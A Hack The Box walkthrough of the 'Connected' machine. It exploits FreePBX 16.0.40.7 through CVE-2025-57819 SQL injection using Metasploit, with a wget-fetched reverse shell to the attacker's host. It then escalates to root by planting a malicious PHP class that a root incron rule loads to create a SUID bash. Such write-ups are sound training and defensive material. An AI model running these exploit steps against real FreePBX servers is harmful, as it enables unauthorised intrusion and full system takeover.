# HTB Connected

## Overview

- Season: 11
- Difficulty: Easy
- OS: Linux
- Initial Access: FreePBX Endpoint Manager SQLi to RCE
- Privilege Escalation: Writable FreePBX HA module loaded by root incron trigger

> Flags, target IPs, and sensitive values are redacted.

## Executive Summary

Connected exposed a FreePBX administration portal over HTTP and HTTPS. The visible version was FreePBX `16.0.40.7`, which matched CVE-2025-57819, an unauthenticated SQL injection in the Endpoint Manager component.

The Metasploit module for the issue initially failed when the FreePBX URI was set to `/admin`. Changing `TARGETURI` to `/` allowed the module to detect the SQL injection, create the cron job, and return a shell as `asterisk`.

Privilege escalation came from `incrond`. A root-owned incron rule watched `/usr/local/asterisk/ha_trigger` and executed `/usr/sbin/sysadmin_ha`. Inspecting that script revealed that it loaded `/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php` and called `rootTrigger()`. Since the FreePBX modules directory was writable by `asterisk`, a malicious PHP class was placed at that path to create a SUID copy of Bash.

## Attack Path

1. Enumerated SSH, HTTP, and HTTPS.
2. Added `connected.htb` and `pbxconnect` to `/etc/hosts`.
3. Identified FreePBX `16.0.40.7` from `/admin/config.php`.
4. Tested UCP, SIP, API, and virtual-host paths without finding credentials or a useful leak.
5. Matched the FreePBX version to CVE-2025-57819.
6. Used Metasploit `freepbx_unauth_sqli_to_rce`.
7. Fixed exploitation by setting `TARGETURI /`.
8. Got a shell as `asterisk`.
9. Found writable incron trigger files and root incron rules.
10. Inspected `/usr/sbin/sysadmin_ha`.
11. Found the exact root-loaded PHP path.
12. Wrote a malicious `incron` class with `rootTrigger()`.
13. Triggered `/usr/local/asterisk/ha_trigger`.
14. Used the created SUID Bash binary to read the root flag.

## Reconnaissance

Initial scan:

```bash
sudo nmap -sCV -p22,80,443 TARGET_IP
```

Findings:

```text
22/tcp   SSH
80/tcp   Apache httpd 2.4.6, PHP 7.4.16
443/tcp  Apache httpd 2.4.6, PHP 7.4.16
```

The hostnames were added locally:

```bash
echo "TARGET_IP connected.htb pbxconnect" | sudo tee -a /etc/hosts
```

The web root redirected toward FreePBX:

```bash
curl -I http://connected.htb/
curl -I http://connected.htb/admin/config.php
```

The application disclosed:

```text
FreePBX Administration
FreePBX 16.0.40.7
```

Why this mattered:

- FreePBX was the main attack surface.
- The exact version made vulnerability research useful.
- The TLS certificate exposed `pbxconnect`, but it did not reveal a separate application.

## Web Enumeration

Useful visible paths:

```text
/admin/config.php
/ucp/
/admin/cxpanel/
/admin/api/
```

Directory fuzzing:

```bash
ffuf -u http://connected.htb/admin/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -e .php,.txt,.bak,.old,.conf,.json \
  -fc 403,404 \
  -fs 204,206,207,208,209,210,211,212
```

Main hits:

```text
/admin/config.php
/admin/api
/admin/assets
/admin/modules
/admin/views
```

Virtual-host fuzzing did not produce a useful result:

```bash
ffuf -u http://TARGET_IP/ \
  -H "Host: FUZZ.connected.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs NORMAL_RESPONSE_SIZE
```

## Dead Ends

### Hidden Login Key

The FreePBX login page contained a hidden-looking value inside:

```html
<div id="key">
```

It was tested as a possible password for `admin` and common UCP extensions, but all attempts failed. Browser storage showed the value was only the PHP session ID.

### UCP

The UCP portal was reachable:

```text
http://connected.htb/ucp/
```

The JavaScript showed the login and forgot-password actions:

```text
module=User&command=login
quietmode=1&module=User&command=forgot
```

Forgot-password returned the same response for real-looking and fake users:

```json
{"status":true,"message":"Submitted"}
```

This meant it was not useful for user enumeration.

Common UCP credentials were also tested:

```text
100:100
101:101
102:102
password
1234
123456
voicemail
changeme
```

All failed.

### SIP

SIP was checked because this was a PBX:

```bash
sudo nmap -sU -sV -p5060,5160 --script sip-methods,sip-enum-users TARGET_IP
svwar -m OPTIONS -e100-999 TARGET_IP
```

The ports were `open|filtered`, but enumeration timed out and did not produce valid extensions.

### API

The FreePBX API existed:

```text
/admin/api/api/gql
/admin/api/api/token
```

GraphQL required a bearer token:

```json
{"error":"access_denied","hint":"Missing \"Authorization\" header"}
```

The OAuth token endpoint required valid client credentials:

```json
{"error":"invalid_client","message":"Client authentication failed"}
```

Obvious client IDs and secrets failed, so this was not the entry point.

## Initial Access

The vulnerable component was FreePBX Endpoint Manager. The exploit used was:

```text
exploit/unix/http/freepbx_unauth_sqli_to_rce
```

The first attempts failed:

```text
payload-failed: Cronjob was not created
No SQL injection detected, target is patched
```

The mistake was `TARGETURI`:

```text
set TARGETURI /admin
```

The working value was:

```text
set TARGETURI /
```

Working options:

```text
set RHOSTS TARGET_IP
set VHOST connected.htb
set TARGETURI /
set LHOST TUN0_IP
set FETCH_SRVHOST TUN0_IP
set FETCH_WRITABLE_DIR /tmp
set FETCH_COMMAND WGET
set payload cmd/linux/http/x64/shell/reverse_tcp
run
```

The VPN MTU was lowered to avoid staged payload issues:

```bash
sudo ip link set dev tun0 mtu 1200
```

Successful result:

```text
The target is vulnerable. Detected SQL injection
Created cronjob
Command shell session opened
```

Shell context:

```bash
whoami
id
```

```text
asterisk
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

User flag:

```bash
cat /home/asterisk/user.txt
```

## Shell Upgrade

Python 3 was not available, but Python was:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Privilege Escalation Enumeration

Incron files were found:

```bash
find / -name '*incron*' 2>/dev/null
```

Important paths:

```text
/etc/incron.d
/usr/local/asterisk/ha_trigger
/usr/local/asterisk/incron
/var/spool/asterisk/sysadmin/incron_restart
/usr/sbin/incrond
```

The incron configuration showed root-controlled automation:

```bash
for f in /etc/incron.d/*; do
  echo "== $f =="
  cat "$f" 2>/dev/null
done
```

Relevant rules:

```text
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

The watched HA trigger was writable by `asterisk`:

```bash
ls -la /usr/local/asterisk/ha_trigger
```

Why this mattered:

The compromised user could modify a file that root watched. The next step was to determine what the root-executed script loaded.

## Failed Privilege Escalation Paths

First, a payload was placed at:

```text
/var/www/html/admin/modules/freepbx_ha/incron.php
```

This did not work because `sysadmin_ha` did not load that file.

Then the framework hook mechanism was tested:

```text
/usr/local/asterisk/incron/SYSTEM.rootbash
```

This also failed because the framework hook system expects signed hook packages, not plain shell scripts.

These failures were useful because they narrowed the target to the HA-specific script.

## Finding The Correct Root-Loaded File

The root-executed script was readable:

```bash
file /usr/sbin/sysadmin_ha
head -n 80 /usr/sbin/sysadmin_ha
```

Key logic:

```php
$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

So the expected file was:

```text
/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
```

It also needed to define:

```text
class incron
method rootTrigger()
```

## Root Exploit

Create the expected module path and PHP class:

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php <<'EOF'
<?php
class incron {
    public function __construct() {}
    public function rootTrigger() {
        copy('/bin/bash', '/tmp/rootbash');
        chmod('/tmp/rootbash', 04755);
    }
}
?>
EOF
```

Trigger the root workflow:

```bash
echo 1 > /usr/local/asterisk/ha_trigger
sleep 5
ls -la /tmp/rootbash
```

Result:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Use the SUID binary:

```bash
/tmp/rootbash -p
id
```

Result:

```text
uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

Root flag:

```bash
cat /root/root.txt
```

## Attack Chain

```text
FreePBX 16.0.40.7
-> CVE-2025-57819 Endpoint Manager SQLi
-> Metasploit RCE with TARGETURI /
-> shell as asterisk
-> writable /usr/local/asterisk/ha_trigger
-> root incron executes /usr/sbin/sysadmin_ha
-> sysadmin_ha loads freepbx_ha/functions.inc/incron.php
-> malicious rootTrigger() creates SUID bash
-> /tmp/rootbash -p
-> root
```

## Key Lessons

- Version disclosure was enough to identify the intended initial exploit.
- A small Metasploit option mismatch, `TARGETURI /admin` vs `/`, caused misleading failed checks.
- The hidden login key was only a session ID.
- UCP forgot-password did not leak valid usernames.
- The privilege escalation required reading the root-executed script instead of guessing the module path.
- The correct file was `freepbx_ha/functions.inc/incron.php`, not `freepbx_ha/incron.php`.

## Cleanup

Artifacts created during exploitation:

```text
/tmp/rootbash
/var/www/html/admin/modules/freepbx_ha/incron.php
/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php
/usr/local/asterisk/incron/SYSTEM.*
```

On Hack The Box, resetting the machine is sufficient.
